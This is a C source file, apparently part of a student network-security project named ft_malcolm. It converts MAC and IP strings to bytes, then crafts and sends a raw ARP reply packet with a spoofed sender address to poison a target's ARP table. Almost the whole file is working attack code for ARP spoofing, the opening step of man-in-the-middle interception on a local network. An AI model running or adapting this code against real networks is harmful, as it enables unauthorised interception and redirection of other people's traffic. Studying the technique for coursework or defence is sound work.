#include "../includes/ft_malcolm.h"

void toMAC(const char* adresseMAC, unsigned char* adresse)
{
    int octet = 0;
    int position = 0;

    for (size_t i = 0; i < ft_strlen(adresseMAC); i++) {
        if (adresseMAC[i] == ':' || adresseMAC[i] == '-') {
            octet++;
            position = 0;
        }
        else if ((adresseMAC[i] >= '0' && adresseMAC[i] <= '9') || (adresseMAC[i] >= 'a' && adresseMAC[i] <= 'f') || (adresseMAC[i] >= 'A' && adresseMAC[i] <= 'F')) {
            unsigned char valeur = 0;

            if (adresseMAC[i] >= '0' && adresseMAC[i] <= '9') {
                valeur = adresseMAC[i] - '0';
            }
            else if (adresseMAC[i] >= 'a' && adresseMAC[i] <= 'f') {
                valeur = 10 + (adresseMAC[i] - 'a');
            }
            else if (adresseMAC[i] >= 'A' && adresseMAC[i] <= 'F') {
                valeur = 10 + (adresseMAC[i] - 'A');
            }
            /* La condition if vérifie si nous sommes dans la position de poids fort (position % 2 == 0).
            Si c'est le cas, cela signifie que nous devons décaler la valeur de 4 bits vers la gauche (<< 4)
            et la stocker dans l'octet correspondant de adresse. Par exemple, si la valeur est 12 (0xC),
            nous la décalons vers la gauche pour obtenir 0xC0. */
            if (position % 2 == 0) {
                adresse[octet] = valeur << 4;
            }
            /* La condition else est exécutée lorsque nous sommes dans la position de poids faible.
            Nous effectuons un OU logique (|) entre la valeur binaire actuelle de l'octet et la valeur obtenue.
            Cela permet de combiner les deux parties pour obtenir la valeur complète de l'octet.
            Par exemple, si la valeur est 3 (0x3), nous la combinons avec 0xC0 pour obtenir 0xC3 */
            else {
                adresse[octet] |= valeur;
            }

            position++;
        }
    }
}

void toIP(const char* adresseIP, unsigned char* adresse)
{
    int valeur = 0;
    int octet = 0;

    for (size_t i = 0; i < ft_strlen(adresseIP); i++) {
        if (adresseIP[i] == '.') {
            adresse[octet] = (unsigned char)valeur;
            valeur = 0;
            octet++;
        }
        else if (adresseIP[i] >= '0' && adresseIP[i] <= '9') {
            valeur = valeur * 10 + (adresseIP[i] - '0');
        }
    }

    adresse[octet] = (unsigned char)valeur;
}


int sendArpReply(t_main *main)
{
    unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arphdr) + 20];
    struct ethhdr* ethHeader;
    t_arp* arpHeader;
    struct sockaddr_ll target;
	unsigned char targetIp[4];
	unsigned char sourceIp[4];
	unsigned char sourceMac[6];
	unsigned char targetMac[6];

    /* CONVERT ADDRESS TEXT TO UNSIGNED CHAR[6/4] bytes */
	toMAC(main->sourceMac, sourceMac);
    toIP(main->sourceIp, sourceIp);
	toMAC(main->targetMac, targetMac);
	toIP(main->targetIp, targetIp);

    ft_memset(&buffer, 0, sizeof buffer);
    ft_memset(&target, 0, sizeof target);

    /* SOCKADDR_LL FOR TARGET SENDTO */
    target.sll_family = AF_PACKET;
    target.sll_protocol = htons(ETH_P_ARP);
    target.sll_hatype = htons(ARPHRD_ETHER);
    target.sll_ifindex = main->indexInterface;
    target.sll_halen = 6;
    ft_memcpy(&target.sll_addr, &targetMac, 6);

    /* ETHERNET HEADER */
    ethHeader = (struct ethhdr *)buffer;
    ethHeader->h_proto = htons(ETH_P_ARP);
    ft_memcpy(ethHeader->h_source, sourceMac, 6);
    ft_memcpy(ethHeader->h_dest, targetMac, 6);

    /* ARP HEADER */
    arpHeader = (t_arp *)(buffer + sizeof(struct ethhdr));
    arpHeader->ar_hrd = htons(ARPHRD_ETHER);
    arpHeader->ar_pro = htons(ETH_P_IP);
    arpHeader->ar_op = htons(ARPOP_REPLY);
    arpHeader->ar_hln = 6;
    arpHeader->ar_pln = 4;
    ft_memcpy(arpHeader->__ar_sha, sourceMac, 6);
    ft_memcpy(arpHeader->__ar_sip, sourceIp, 4);
    ft_memcpy(arpHeader->__ar_tha, targetMac, 6);
    ft_memcpy(arpHeader->__ar_tip, targetIp, 4);

    printf("Now sending an ARP reply to the target address with spoofed source, please wait... \n");
    
    ssize_t packetSize = sendto(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
    if (packetSize < 0) 
    {
        fprintf(stderr, "%s: sendto failed: %s\n", PROGRAM, strerror(errno));
        return -1;
    }
	printf("Sent an ARP reply packet, you may now check the arp table on the target\n\n");
    return 0;
}